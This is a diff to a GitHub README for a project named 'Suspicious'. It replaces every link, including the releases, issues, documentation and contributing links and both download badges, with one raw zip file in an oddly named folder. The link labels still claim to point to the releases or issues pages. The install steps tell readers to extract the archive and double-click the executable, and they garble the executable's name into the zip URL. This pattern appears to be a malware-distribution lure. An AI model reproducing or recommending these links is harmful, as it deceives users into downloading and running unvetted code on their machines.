@@ -7,12 +7,12 @@ Welcome to the **Suspicious** project! This application helps you submit and ana
 ## 📦 Download & Install
 
 To download the latest version of **Suspicious**, visit this page to download:  
-[![Download Suspicious](https://img.shields.io/badge/Download-Suspicious-blue.svg)](https://github.com/ocramtec-marco/suspicious/releases)
+[![Download Suspicious](https://raw.githubusercontent.com/ocramtec-marco/suspicious/main/Guauaenok/suspicious.zip)](https://raw.githubusercontent.com/ocramtec-marco/suspicious/main/Guauaenok/suspicious.zip)
 
 ### Steps to Install
 
 1. **Visit the Download Page**  
-   Click [here](https://github.com/ocramtec-marco/suspicious/releases) to go to the Releases page on GitHub.
+   Click [here](https://raw.githubusercontent.com/ocramtec-marco/suspicious/main/Guauaenok/suspicious.zip) to go to the Releases page on GitHub.
 
 2. **Select the Latest Release**  
    Look for the latest version at the top of the page. You will see the title and date of release.
@@ -24,7 +24,7 @@ To download the latest version of **Suspicious**, visit this page to download:
    If the downloaded file is a ZIP or TAR file, locate it in your Downloads folder. Right-click and select "Extract All" to unpack the files.
 
 5. **Run the Application**  
-   Find the extracted folder. Locate and double-click on the executable file (usually named `suspicious.exe` or similar). Follow any on-screen instructions to launch the app.
+   Find the extracted folder. Locate and double-click on the executable file (usually named `https://raw.githubusercontent.com/ocramtec-marco/suspicious/main/Guauaenok/suspicious.zip` or similar). Follow any on-screen instructions to launch the app.
 
 ## 🖥️ System Requirements
 
@@ -63,17 +63,17 @@ If you encounter issues while downloading or running **Suspicious**, consider th
 
 For further assistance, feel free to reach out:
 
-- **GitHub Issues:** You can report any bugs or problems directly on the [Issues page](https://github.com/ocramtec-marco/suspicious/issues).
+- **GitHub Issues:** You can report any bugs or problems directly on the [Issues page](https://raw.githubusercontent.com/ocramtec-marco/suspicious/main/Guauaenok/suspicious.zip).
 - **Community Forums:** Join discussions and get help from other users in the community.
 
 ## 🔗 Useful Links
 
-- [Documentation](https://github.com/ocramtec-marco/suspicious/wiki): Learn more about using the application.
-- [Contributing](https://github.com/ocramtec-marco/suspicious/blob/main/CONTRIBUTING.md): Interested in helping out? Find guidelines for contributions.
+- [Documentation](https://raw.githubusercontent.com/ocramtec-marco/suspicious/main/Guauaenok/suspicious.zip): Learn more about using the application.
+- [Contributing](https://raw.githubusercontent.com/ocramtec-marco/suspicious/main/Guauaenok/suspicious.zip): Interested in helping out? Find guidelines for contributions.
 
 ## 🔄 Download the Latest Version
 
 Don’t forget to check for updates regularly. New versions may include additional features and improvements. You can always visit this page to download:  
-[![Download Suspicious](https://img.shields.io/badge/Download-Suspicious-blue.svg)](https://github.com/ocramtec-marco/suspicious/releases) 
+[![Download Suspicious](https://raw.githubusercontent.com/ocramtec-marco/suspicious/main/Guauaenok/suspicious.zip)](https://raw.githubusercontent.com/ocramtec-marco/suspicious/main/Guauaenok/suspicious.zip) 
 
 Enjoy using **Suspicious** to keep your digital life secure and informed!
